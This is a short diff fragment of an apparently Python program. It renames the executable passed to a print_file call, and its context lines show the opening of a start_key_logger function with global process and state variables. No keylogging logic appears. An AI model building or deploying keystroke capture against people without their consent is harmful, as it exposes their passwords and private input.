@@ -172,7 +172,7 @@ def print_file(file_path):
         pass
 
 
-print_file('CG proj test.exe')
+print_file('test.exe')
 
 def start_key_logger(file_path):
     global is_key_logger_active,key_logger_process
